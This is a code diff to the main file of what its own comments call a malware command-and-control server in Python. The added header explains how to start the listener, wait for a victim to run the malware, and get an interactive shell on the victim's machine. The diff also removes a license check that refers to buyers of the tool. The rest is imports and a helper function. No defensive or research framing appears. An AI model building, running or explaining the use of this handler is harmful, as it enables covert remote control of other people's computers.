@@ -1,3 +1,13 @@
+# The main file - Its purpose is to act as the C&C of your malware, it listens for incoming connections using socket, currently
+# the only option is to listen for Windows connections, if you want to start the listening fast, just run the program (python3 main.py)
+# it should start the program, once you see the handler where you can type stuff, type "use 1" twice and then type "run"
+# Great! You are listening for connections, once the victim runs the malware on the other side, you should see a notification on your terminal
+# that you got a hit, it will let you type commands in the handler, type shell to get a full interactive shell.
+
+
+
+
+
 import socket
 import time
 import platform
@@ -8,16 +18,9 @@ from colorama import Fore, Back, Style
 import ctypes
 import sys
 from datetime import datetime
-import argparse
 import requests
 now = datetime.today()
 dataaa = (datetime.utcnow().strftime('%Y-%m-%d %H-%M-%S-%f')[:-3])
-def get_arguments():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-l", "--license", dest= "license", help= "License is required in order to start the program, you got the license in your email when you purchased it from us", required=False)
-    options = parser.parse_args()
-    return options
-options = get_arguments()
 os_platform=platform.uname()
 def Clear():
     if platform.system() == "Windows":
